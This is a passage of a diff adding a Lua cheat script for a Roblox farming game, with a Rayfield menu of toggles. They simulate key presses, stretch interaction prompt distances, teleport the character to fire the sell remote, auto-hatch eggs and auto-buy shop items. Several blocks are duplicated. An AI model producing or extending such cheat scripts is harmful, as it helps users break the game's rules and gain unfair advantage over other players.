+	local farm = findPlayersFarm()
+	if not farm then return end
+
+	local petEggs = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Objects_Physical") and farm.Important.Objects_Physical:FindFirstChild("PetEgg")
+	if petEggs then
+		for _, egg in ipairs(petEggs:GetChildren()) do
+			for _, desc in ipairs(egg:GetDescendants()) do
+				if desc:IsA("ProximityPrompt") then
+					if not originalDistances[desc] then
+						originalDistances[desc] = desc.MaxActivationDistance
+					end
+					desc.MaxActivationDistance = 3.8
+				end
+			end
+		end
+	end
+end
+
+local function startHoldingE()
+	if holdEConnection then holdEConnection:Disconnect() end
+	VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+	holdEConnection = RunService.Heartbeat:Connect(function()
+		VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+	end)
+end
+
+local function stopHoldingE()
+	if holdEConnection then
+		holdEConnection:Disconnect()
+		holdEConnection = nil
+	end
+	VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+end
+
+local function isPlayerInFarm(farm)
+	local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+	if not root or not farm then return false end
+
+	local parts = {}
+	for _, descendant in ipairs(farm:GetDescendants()) do
+		if descendant:IsA("BasePart") then
+			table.insert(parts, descendant)
+		end
+	end
+	if #parts == 0 then return false end
+
+	local minVec, maxVec = parts[1].Position, parts[1].Position
+	for _, part in ipairs(parts) do
+		local pos = part.Position
+		minVec = Vector3.new(math.min(minVec.X, pos.X), math.min(minVec.Y, pos.Y), math.min(minVec.Z, pos.Z))
+		maxVec = Vector3.new(math.max(maxVec.X, pos.X), math.max(maxVec.Y, pos.Y), math.max(maxVec.Z, pos.Z))
+	end
+
+	local padding = 5
+	minVec = minVec - Vector3.new(padding, padding, padding)
+	maxVec = maxVec + Vector3.new(padding, padding, padding)
+	local pos = root.Position
+
+	return pos.X >= minVec.X and pos.X <= maxVec.X and
+		   pos.Y >= minVec.Y and pos.Y <= maxVec.Y and
+		   pos.Z >= minVec.Z and pos.Z <= maxVec.Z
+end
+
+function startPromptUpdater()
+	if promptUpdateConnection then return end
+	promptUpdateConnection = task.spawn(function()
+		while running do
+			increaseFruitPromptDistances(2000)
+			task.wait(1)
+		end
+	end)
+end
+
+function stopPromptUpdater()
+	if promptUpdateConnection then
+		task.cancel(promptUpdateConnection)
+		promptUpdateConnection = nil
+	end
+end
+
+
+
+FarmTab:CreateToggle({
+    Name = "Auto Collect Fruits (Auto)",
+    CurrentValue = false,
+    Flag = "AutoFarmToggle",
+    Callback = function(state)
+        running = state
+        if running and not farmingLoopRunning then
+            farmingLoopRunning = true
+            disableGrowSignPrompts()
+            minimizeEggPromptDistances()
+
+            task.spawn(function()
+                while true do
+                    if feedingActive then
+                        local pets = getAllPets()
+                        anchorAllPets(pets, true)
+
+                        for _, pet in ipairs(pets) do
+                            local rootPart = pet:FindFirstChild("RootPart")
+                            if rootPart then
+                                for i = 1, 3 do
+                                    if not feedingActive then break end 
+                                    moveToPosition(rootPart.Position)
+                                    if not feedingActive then break end  
+                                    holdFKey()
+                                end
+                                if not feedingActive then break end  
+                            end
+                        end
+                    else
+                        local pets = getAllPets()
+                        anchorAllPets(pets, false)
+                    end
+                    wait(1)
+                end
+            end) 
+        end
+    end 
+})
+
+
+
+
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local autoFarmEnabled = false
+local wasPausedDueToFull = false
+local farmConnection = nil
+
+
+local function getBackpackCount()
+    return #player.Backpack:GetChildren()
+end
+
+
+
+ function startFarm()
+    if farmConnection then return end
+
+    farmConnection = RunService.RenderStepped:Connect(function()
+        if autoFarmEnabled then
+            local count = getBackpackCount()
+
+            if count >= 210 then
+                if not wasPausedDueToFull then
+                    warn("[AutoFarm] Backpack full (200), pausing farm.")
+                    wasPausedDueToFull = true
+                end
+                return -- skip sending key
+            else
+                if wasPausedDueToFull then
+                    print("[AutoFarm] Backpack has room again, resuming farm.")
+                    wasPausedDueToFull = false
+                end
+            end
+
+            -- Simulate E key press
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+            task.wait(0.05)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+        end
+    end)
+end
+
+ function stopFarm()
+    if farmConnection then
+        farmConnection:Disconnect()
+        farmConnection = nil
+    end
+end
+
+-- UI Toggle hook
+FarmTab:CreateToggle({
+    Name = "Auto Collect Fruits (Aura)",
+    CurrentValue = false,
+    Flag = "FarmToggle",
+    Callback = function(toggle)
+        autoFarmEnabled = toggle
+        if toggle then
+            print("[AutoFarm] Toggle ON, starting farm.")
+            startFarm()
+        else
+            print("[AutoFarm] Toggle OFF, stopping farm.")
+            wasPausedDueToFull = false
+            stopFarm()
+        end
+    end
+})
+
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+local favoriteRemote = ReplicatedStorage:WaitForChild("GameEvents"):FindFirstChild("Favorite_Item") or ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("FavoriteToolRemote")
+
+local favorited = {}
+local toggleActive = false
+local heartbeatConnection
+
+local function isTargetFruit(name)
+	return name:find("Moonlit") or name:find("Bloodlit")
+end
+
+local function favoriteItem(item)
+	if not favorited[item] then
+		favorited[item] = true
+		favoriteRemote:FireServer(item)
+		print("Favorited:", item.Name)
+	end
+end
+
+function hasTargetFruits()
+	for _, tool in ipairs(backpack:GetChildren()) do
+		if tool:IsA("Tool") and isTargetFruit(tool.Name) then
+			return true
+		end
+	end
+	return false
+end
+
+function scanAndFavorite()
+	for _, tool in ipairs(backpack:GetChildren()) do
+		if tool:IsA("Tool") and isTargetFruit(tool.Name) then
+			favoriteItem(tool)
+		end
+	end
+end
+
+FarmTab:CreateToggle({
+	Name = "Auto Favorite Bloodlit/Moonlit Fruits",
+	CurrentValue = false,
+	Flag = "AutoFavoriteSmart",
+	Callback = function(state)
+		toggleActive = state
+
+		if state then
+			-- Enable smart detection
+			heartbeatConnection = RunService.Heartbeat:Connect(function()
+				if hasTargetFruits() then
+					scanAndFavorite()
+				end
+			end)
+			print("auto-favoriting enabled.")
+		else
+			-- Disable everything
+			if heartbeatConnection then
+				heartbeatConnection:Disconnect()
+				heartbeatConnection = nil
+			end
+			favorited = {}
+			print("auto-favoriting disabled.")
+		end
+	end
+})
+
+
+Section = FarmTab:CreateSection("Auto Sell")
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+
+FarmTab:CreateButton({
+	Name = "Auto Sell Inventory",
+	Callback = function()
+		local player = Players.LocalPlayer
+		local character = player.Character or player.CharacterAdded:Wait()
+		local hrp = character:WaitForChild("HumanoidRootPart")
+
+		local sellEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Sell_Inventory")
+		local tutorialPoints = Workspace:WaitForChild("Tutorial_Points")
+		local tutorialPoint = tutorialPoints:WaitForChild("Tutorial_Point_2")
+
+		local originalCFrame = hrp.CFrame
+
+		-- Move to sell point
+		hrp.CFrame = tutorialPoint.CFrame + Vector3.new(0, 3, 0)
+
+		task.delay(0.2, function()
+			pcall(function()
+				sellEvent:FireServer()
+
+				local updatedChar = player.Character or player.CharacterAdded:Wait()
+				if updatedChar:FindFirstChild("HumanoidRootPart") then
+					updatedChar.HumanoidRootPart.CFrame = originalCFrame
+				end
+			end)
+		end)
+	end,
+})
+
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+
+local sellEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Sell_Inventory")
+local tutorialPoint = Workspace:WaitForChild("Tutorial_Points"):WaitForChild("Tutorial_Point_2")
+
+local autoSellEnabled = false
+local maxBackpackSize = 200 -- change this to your actual max capacity
+
+-- Toggle UI using Rayfield
+FarmTab:CreateToggle({
+	Name = "Auto Sell When Full (200 Items)",
+	CurrentValue = false,
+	Callback = function(Value)
+		autoSellEnabled = Value
+	end,
+})
+
+-- Function to check if backpack is full (based on item count)
+function isBackpackFull()
+	local backpack = player:FindFirstChild("Backpack")
+	if backpack then
+		local itemCount = #backpack:GetChildren()
+		return itemCount >= maxBackpackSize
+	end
+	return false
+end
+
+-- Function to auto sell
+ function autoSellInventory()
+	local originalCFrame = hrp.CFrame
+
+	-- Move to the sell point
+	hrp.CFrame = tutorialPoint.CFrame + Vector3.new(0, 3, 0)
+
+	task.delay(0.27, function()
+		sellEvent:FireServer()
+    task.wait(0.4)
+		-- Return to original position
+		local updatedChar = player.Character
+		if updatedChar and updatedChar:FindFirstChild("HumanoidRootPart") then
+			updatedChar.HumanoidRootPart.CFrame = originalCFrame
+		end
+	end)
+end
+
+-- Loop to check if backpack is full
+task.spawn(function()
+	while true do
+		task.wait(1)
+		if autoSellEnabled and isBackpackFull() then
+			autoSellInventory()
+		end
+	end
+end)
+
+
+Section = FarmTab:CreateSection("Egg Section")
+
+-- SERVICES
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+
+-- PLAYER
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+
+-- SETTINGS
+local teleportDelay = 0.1
+local holdETime = 1.5
+local checkInterval = 2
+local autoHatchEggs = false
+
+-- FUNCTION: Tween to position with clamped speed
+function tweenToPosition(targetPosition)
+	local distance = (targetPosition - hrp.Position).Magnitude
+	local travelTime = math.clamp(distance / 100, 0.05, 0.25)
+
+	local tweenInfo = TweenInfo.new(travelTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+	local tween = TweenService:Create(hrp, tweenInfo, {CFrame = CFrame.new(targetPosition)})
+	tween:Play()
+	tween.Completed:Wait()
+end
+
+-- FUNCTION: Hold E key for specified time
+function holdE()
+	VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+	task.wait(holdETime)
+	VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+end
+
+
+function getOwnedFarm()
+farmsFolder = Workspace:FindFirstChild("Farm")
+	if not farmsFolder then 
+		warn("[AutoHatch] No Farm folder found")
+		return nil 
+	end
+
+	local playerName = player.Name
+	local farms = farmsFolder:GetChildren()
+	for i = 1, #farms do
+		local farm = farms[i]
+		local important = farm:FindFirstChild("Important")
+		if important then
+			local dataFolder = important:FindFirstChild("Data")
+			if dataFolder then
+				local ownerValue = dataFolder:FindFirstChild("Owner")
+				if ownerValue and ownerValue:IsA("StringValue") then
+					if ownerValue.Value == playerName then
+						print("[AutoHatch] Owned farm found:", farm.Name)
+						return farm
+					end
+				end
+			end
+		end
+	end
+
+	warn("[AutoHatch] No farm owned by player found")
+	return nil
+end
+
+
+
+-- FUNCTION: Get eggs ready to hatch from owned farm (optimized)
+function getReadyToHatchEggs()
+	local readyEggs = {}
+	local ownedFarm = getOwnedFarm()
+	if not ownedFarm then 
+		warn("[AutoHatch] Owned farm is nil, no eggs to hatch")
+		return readyEggs 
+	end
+
+	local important = ownedFarm:FindFirstChild("Important")
+	if not important then 
+		warn("[AutoHatch] Important folder missing in owned farm")
+		return readyEggs 
+	end
+
+	local objPhys = important:FindFirstChild("Objects_Physical")
+	if not objPhys then 
+		warn("[AutoHatch] Objects_Physical missing in Important folder")
+		return readyEggs 
+	end
+
+	local children = objPhys:GetChildren()
+	for i = 1, #children do
+		local obj = children[i]
+		if obj:IsA("Model") and obj.Name == "PetEgg" then
+			local timeToHatch = obj:GetAttribute("TimeToHatch")
+			if timeToHatch and timeToHatch <= 0 then
+				local part = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
+				if part then
+					obj.PrimaryPart = part
+					table.insert(readyEggs, obj)
+				end
+			end
+		end
+	end
+
+	print("[AutoHatch] Eggs ready to hatch found: ", #readyEggs)
+	return readyEggs
+end
+
+
+-- MAIN HATCHING LOOP (spawned once, throttled)
+task.spawn(function()
+	while true do
+		if autoHatchEggs then
+			local eggs = getReadyToHatchEggs()
+			for i = 1, #eggs do
+				if not autoHatchEggs then break end
+				local egg = eggs[i]
+				local targetPos = egg.PrimaryPart.Position + Vector3.new(0, 3, 0)
+				tweenToPosition(targetPos)
+				task.wait(teleportDelay)
+				holdE()
+			end
+		end
+		task.wait(checkInterval)
+	end
+end)
+
+-- RAYFIELD TOGGLE (put inside your FarmTab)
+FarmTab:CreateToggle({
+	Name = "Auto Hatch Eggs (Beta)",
+	CurrentValue = false,
+	Flag = "AutoHatchOwnedFarm",
+	Callback = function(toggle)
+		autoHatchEggs = toggle
+		if toggle then
+			print("[AutoHatch] Enabled for owned farm")
+		else
+			print("[AutoHatch] Disabled")
+		end
+	end
+})
+
+
+
+-- SERVICES
+ Players = game:GetService("Players")
+ TweenService = game:GetService("TweenService")
+ VirtualInputManager = game:GetService("VirtualInputManager")
+ RunService = game:GetService("RunService")
+ Workspace = game:GetService("Workspace")
+
+-- PLAYER
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+
+-- SETTINGS
+local teleportDelay = 0.1
+local holdETime = 1.5
+local checkInterval = 2
+local autoHatchEggs = false
+
+-- FUNCTION: Tween to position with clamped speed
+function tweenToPosition(targetPosition)
+	local distance = (targetPosition - hrp.Position).Magnitude
+	local travelTime = math.clamp(distance / 100, 0.05, 0.25)
+
+	local tweenInfo = TweenInfo.new(travelTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+	local tween = TweenService:Create(hrp, tweenInfo, {CFrame = CFrame.new(targetPosition)})
+	tween:Play()
+	tween.Completed:Wait()
+end
+
+-- FUNCTION: Hold E key for specified time
+function holdE()
+	VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+	task.wait(holdETime)
+	VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+end
+
+
+function getOwnedFarm()
+	local farmsFolder = Workspace:FindFirstChild("Farm")
+	if not farmsFolder then 
+		warn("[AutoHatch] No Farm folder found")
+		return nil 
+	end
+
+	local playerName = player.Name
+	local farms = farmsFolder:GetChildren()
+	for i = 1, #farms do
+		local farm = farms[i]
+		local important = farm:FindFirstChild("Important")
+		if important then
+			local dataFolder = important:FindFirstChild("Data")
+			if dataFolder then
+				local ownerValue = dataFolder:FindFirstChild("Owner")
+				if ownerValue and ownerValue:IsA("StringValue") then
+					if ownerValue.Value == playerName then
+						print("[AutoHatch] Owned farm found:", farm.Name)
+						return farm
+					end
+				end
+			end
+		end
+	end
+
+	warn("[AutoHatch] No farm owned by player found")
+	return nil
+end
+
+
+
+-- FUNCTION: Get eggs ready to hatch from owned farm (optimized)
+function getReadyToHatchEggs()
+	local readyEggs = {}
+	local ownedFarm = getOwnedFarm()
+	if not ownedFarm then 
+		warn("[AutoHatch] Owned farm is nil, no eggs to hatch")
+		return readyEggs 
+	end
+
+	local important = ownedFarm:FindFirstChild("Important")
+	if not important then 
+		warn("[AutoHatch] Important folder missing in owned farm")
+		return readyEggs 
+	end
+
+	local objPhys = important:FindFirstChild("Objects_Physical")
+	if not objPhys then 
+		warn("[AutoHatch] Objects_Physical missing in Important folder")
+		return readyEggs 
+	end
+
+	local children = objPhys:GetChildren()
+	for i = 1, #children do
+		local obj = children[i]
+		if obj:IsA("Model") and obj.Name == "PetEgg" then
+			local timeToHatch = obj:GetAttribute("TimeToHatch")
+			if timeToHatch and timeToHatch <= 0 then
+				local part = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
+				if part then
+					obj.PrimaryPart = part
+					table.insert(readyEggs, obj)
+				end
+			end
+		end
+	end
+
+	print("[AutoHatch] Eggs ready to hatch found: ", #readyEggs)
+	return readyEggs
+end
+
+
+-- MAIN HATCHING LOOP (spawned once, throttled)
+task.spawn(function()
+	while true do
+		if autoHatchEggs then
+			local eggs = getReadyToHatchEggs()
+			for i = 1, #eggs do
+				if not autoHatchEggs then break end
+				local egg = eggs[i]
+				local targetPos = egg.PrimaryPart.Position + Vector3.new(0, 3, 0)
+				tweenToPosition(targetPos)
+				task.wait(teleportDelay)
+				holdE()
+			end
+		end
+		task.wait(checkInterval)
+	end
+end)
+
+-- RAYFIELD TOGGLE (put inside your FarmTab)
+FarmTab:CreateToggle({
+	Name = "Auto Hatch Eggs (Beta)",
+	CurrentValue = false,
+	Flag = "AutoHatchOwnedFarm",
+	Callback = function(toggle)
+		autoHatchEggs = toggle
+		if toggle then
+			print("[AutoHatch] Enabled for owned farm")
+		else
+			print("[AutoHatch] Disabled")
+		end
+	end
+}) 
+
+
+
+local Tab = Window:CreateTab("Auto Buy", 4483362458)
+
+
+Section = Tab:CreateSection("Shop Ui Toggles")
+
+local toggles = {"ToggleSeedShopUI", "ToggleGearShopUI", "ToggleCosmeticShop", "ToggleEventShopUI"}
+local activeToggle = nil
+
+function toggleExclusive(flag, state)
+    if state then
+        for _, otherFlag in ipairs(toggles) do
+            if otherFlag ~= flag then
+                Rayfield:UpdateToggle({
+                    Flag = otherFlag,
+                    Value = false
+                })
+            end
+        end
+        activeToggle = flag
+    else
+        if activeToggle == flag then
+            activeToggle = nil
+        end
+    end
+end
+
+
+toggle = Tab:CreateToggle({
+    Name = "Seed Shop UI",
+    CurrentValue = false,
+    Flag = "ToggleSeedShopUI",
+    Callback = function(state)
+        local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+        local seedShopUI = playerGui:FindFirstChild("Seed_Shop")
+        if seedShopUI then
+            seedShopUI.Enabled = state
+        end
+    end
+})
+
+
+toggle = Tab:CreateToggle({
+    Name = "Gear Shop UI",
+    CurrentValue = false,
+    Flag = "ToggleGearShopUI",
+    Callback = function(state)
+        local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+        local gearShopUI = playerGui:FindFirstChild("Gear_Shop")
+        if gearShopUI then
+            gearShopUI.Enabled = state
+        end
+    end
+})
+
+
+toggle = Tab:CreateToggle({
+    Name = "Cosmetic Shop UI",
+    CurrentValue = false,
+    Flag = "ToggleCosmeticShop",
+    Callback = function(state)
+        local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+        local cosmeticShopUI = playerGui:FindFirstChild("CosmeticShop_UI")
+        if cosmeticShopUI then
+            cosmeticShopUI.Enabled = state
+        end
+    end
+})
+
+toggle = Tab:CreateToggle({
+    Name = "Event Shop UI",
+    CurrentValue = false,
+    Flag = "ToggleEventShopUI",
+    Callback = function(state)
+        local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+        local eventShopUI = playerGui:FindFirstChild("EventShop_UI")
+        if eventShopUI then
+            eventShopUI.Enabled = state
+        end
+    end
+})
+
+
+
+Section = Tab:CreateSection("Seed Shop AutoBuys")
+
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy carrot (10¢)", 
+   CurrentValue = false,
+   Flag = "carrot", 
+   Callback = function(Value)
+      if Value then
+         carrot = true
+         Notification("carrot auto buy active!", 0.5, 255, 0, 0)
+      elseif not Value then
+         carrot = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy strawberry (50¢)", 
+   CurrentValue = false,
+   Flag = "strawberry", 
+   Callback = function(Value)
+      if Value then
+          Notification("strawberry auto buy active!", 0.5, 255, 0, 0)
+         strawberry = true
+      elseif not Value then
+         strawberry = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy blueberry (400¢)", 
+   CurrentValue = false,
+   Flag = "blueberry", 
+   Callback = function(Value)
+      if Value then
+          Notification("blueberry auto buy active!", 0.5, 255, 0, 0)
+         blueberry = true
+      elseif not Value then
+         blueberry = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy orange tulip (600¢)", 
+   CurrentValue = false,
+   Flag = "orange_tulip", 
+   Callback = function(Value)
+      if Value then
+          Notification("orange tulip auto buy active!", 0.5, 255, 0, 0)
+         orange_tulip = true
+      elseif not Value then
+         orange_tulip = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy tomato (800¢)", 
+   CurrentValue = false,
+   Flag = "tomato", 
+   Callback = function(Value)
+      if Value then
+          Notification("tomato auto buy active!", 0.5, 255, 0, 0)
+         tomato = true
+      elseif not Value then
+         tomato = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy corn (1,300¢)", 
+   CurrentValue = false,
+   Flag = "corn", 
+   Callback = function(Value)
+      if Value then
+          Notification("corn auto buy active!", 0.5, 255, 0, 0)
+         corn = true
+      elseif not Value then
+         corn = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy daffodil (1,000¢)", 
+   CurrentValue = false,
+   Flag = "daffodil", 
+   Callback = function(Value)
+      if Value then
+          Notification("daffodil auto buy active!", 0.5, 255, 0, 0)
+         daffodil = true
+      elseif not Value then
+         daffodil = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy watermelon (2,500¢)", 
+   CurrentValue = false,
+   Flag = "watermelon", 
+   Callback = function(Value)
+      if Value then
+          Notification("watermelon auto buy active!", 0.5, 255, 0, 0)
+         watermelon = true
+      elseif not Value then
+         watermelon = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy pumpkin (3,000¢)", 
+   CurrentValue = false,
+   Flag = "pumpkin", 
+   Callback = function(Value)
+      if Value then
+          Notification("pumpkin auto buy active!", 0.5, 255, 0, 0)
+         pumpkin = true
+      elseif not Value then
+         pumpkin = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy apple (3,250¢)", 
+   CurrentValue = false,
+   Flag = "apple", 
+   Callback = function(Value)
+      if Value then
+          Notification("apple auto buy active!", 0.5, 255, 0, 0)
+         apple = true
+      elseif not Value then
+         apple = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy bamboo (4,000¢)", 
+   CurrentValue = false,
+   Flag = "bamboo", 
+   Callback = function(Value)
+      if Value then
+          Notification("bamboo auto buy active!", 0.5, 255, 0, 0)
+         bamboo = true
+      elseif not Value then
+         bamboo = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy coconut (6,000¢)", 
+   CurrentValue = false,
+   Flag = "coconut", 
+   Callback = function(Value)
+      if Value then
+          Notification("coconut auto buy active!", 0.5, 255, 0, 0)
+         coconut = true
+      elseif not Value then
+         coconut = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy cactus (15,000¢)", 
+   CurrentValue = false,
+   Flag = "cactus", 
+   Callback = function(Value)
+      if Value then
+          Notification("cactus auto buy active!", 0.5, 255, 0, 0)
+         cactus = true
+      elseif not Value then
+         cactus = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy dragon fruit (50,000¢)", 
+   CurrentValue = false,
+   Flag = "dragon_fruit", 
+   Callback = function(Value)
+      if Value then
+          Notification("dragon fruit auto buy active!", 0.5, 255, 0, 0)
+         dragon_fruit = true
+      elseif not Value then
+         dragon_fruit = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy mango (100,000¢)", 
+   CurrentValue = false,
+   Flag = "mango", 
+   Callback = function(Value)
+      if Value then
+          Notification("mango auto buy active!", 0.5, 255, 0, 0)
+         mango = true
+      elseif not Value then
+         mango = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy grape (850,000¢)", 
+   CurrentValue = false,
+   Flag = "grape", 
+   Callback = function(Value)
+      if Value then
+          Notification("grape auto buy active!", 0.5, 255, 0, 0)
+         grape = true
+      elseif not Value then
+         grape = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy mushroom (150,000¢)", 
+   CurrentValue = false,
+   Flag = "mushroom", 
+   Callback = function(Value)
+      if Value then
+          Notification("mushroom auto buy active!", 0.5, 255, 0, 0)
+         mushroom = true
+      elseif not Value then
+         mushroom = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy pepper (1,000,000¢)", 
+   CurrentValue = false,
+   Flag = "pepper", 
+   Callback = function(Value)
+      if Value then
+          Notification("pepper auto buy active!", 0.5, 255, 0, 0)
+         pepper = true
+      elseif not Value then
+         pepper = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy cacao (2,500,000¢)", 
+   CurrentValue = false,
+   Flag = "cacao", 
+   Callback = function(Value)
+      if Value then
+          Notification("cacao auto buy active!", 0.5, 255, 0, 0)
+         cacao = true
+      elseif not Value then
+         cacao = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy beanstalk (10,000,000¢)", 
+   CurrentValue = false,
+   Flag = "bean", 
+   Callback = function(Value)
+      if Value then
+          Notification("beanstalk auto buy active !MAYBE NOT WORK!", 0.5, 255, 255, 0)
+         bean = true
+      elseif not Value then
+         bean = false
+      end
+   end,
+})
+
+Section = Tab:CreateSection("Gear Shop AutoBuys")
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy watering can (50,000¢)", 
+   CurrentValue = false,
+   Flag = "water", 
+   Callback = function(Value)
+      if Value then
+          Notification("watering can auto buy active!", 0.5, 255, 0, 0)
+         watering = true
+      elseif not Value then
+         watering = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy trowl tool (100,000¢)", 
+   CurrentValue = false,
+   Flag = "trowl", 
+   Callback = function(Value)
+      if Value then
+          Notification("trowl tool auto buy active!", 0.5, 255, 0, 0)
+         trowl = true
+      elseif not Value then
+         trowl = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy recall wrench (150,000¢)", 
+   CurrentValue = false,
+   Flag = "wrench", 
+   Callback = function(Value)
+      if Value then
+          Notification("harvest tool auto buy active!", 0.5, 255, 0, 0)
+         wrench = true
+      elseif not Value then
+        wrench = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy basic sprinkler (25,000¢)", 
+   CurrentValue = false,
+   Flag = "water", 
+   Callback = function(Value)
+      if Value then
+          Notification("basic sprinkler auto buy active!", 0.5, 255, 0, 0)
+         basic = true
+      elseif not Value then
+         basic = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy advanced sprinkler (50,000¢)", 
+   CurrentValue = false,
+   Flag = "water", 
+   Callback = function(Value)
+      if Value then
+          Notification("advanced auto buy active!", 0.5, 255, 0, 0)
+         advanced = true
+      elseif not Value then
+         advanced = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy godly sprinkler (120,000¢)", 
+   CurrentValue = false,
+   Flag = "water", 
+   Callback = function(Value)
+      if Value then
+          Notification("godly sprinkler auto buy active!", 0.5, 255, 0, 0)
+         godly = true
+      elseif not Value then
+         godly = false
+      end
+   end,
+})
+
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy master sprinkler (10,000,000¢)", 
+   CurrentValue = false,
+   Flag = "master", 
+   Callback = function(Value)
+      if Value then
+          Notification("master sprinkler auto buy active!", 0.5, 255, 0, 0)
+         master = true
+      elseif not Value then
+        master = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy lightning rod (1,000,000¢)", 
+   CurrentValue = false,
+   Flag = "light", 
+   Callback = function(Value)
+      if Value then
+          Notification("lightning auto buy active!", 0.5, 255, 0, 0)
+         light = true
+      elseif not Value then
+        light = false
+      end
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy favorite tool (20,000,000¢)",
+   CurrentValue = false,
+   Flag = "favorite",
+   Callback = function(Value)
+      if Value then
+         Notification("Favorite Tool auto buy enabled!", 0.5, 0, 255, 0)
+         favorite = true
+      else
+         favorite = false
+      end
+   end,
+})
+
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy harvest tool (30,000,000¢)", 
+   CurrentValue = false,
+   Flag = "harvest", 
+   Callback = function(Value)
+      if Value then
+          Notification("harvest tool auto buy active!", 0.5, 255, 0, 0)
+         harvest = true
+      elseif not Value then
+        harvest = false
+      end
+   end,
+})
+
+Section = Tab:CreateSection("Egg Shop AutoBuys")
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy Common Egg (50,000¢)", 
+   CurrentValue = false,
+   Flag = "commonegg", 
+   Callback = function(Value)
+commonegg = Value
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy Uncommon Egg (150,000¢)", 
+   CurrentValue = false,
+   Flag = "uncommonegg", 
+   Callback = function(Value)
+       uncommonegg = Value
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy Rare Egg (600,000¢)", 
+   CurrentValue = false,
+   Flag = "rareegg", 
+   Callback = function(Value)
+       rareegg = Value
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy Legendary Egg (3,000,000¢)", 
+   CurrentValue = false,
+   Flag = "legendaryegg", 
+   Callback = function(Value)
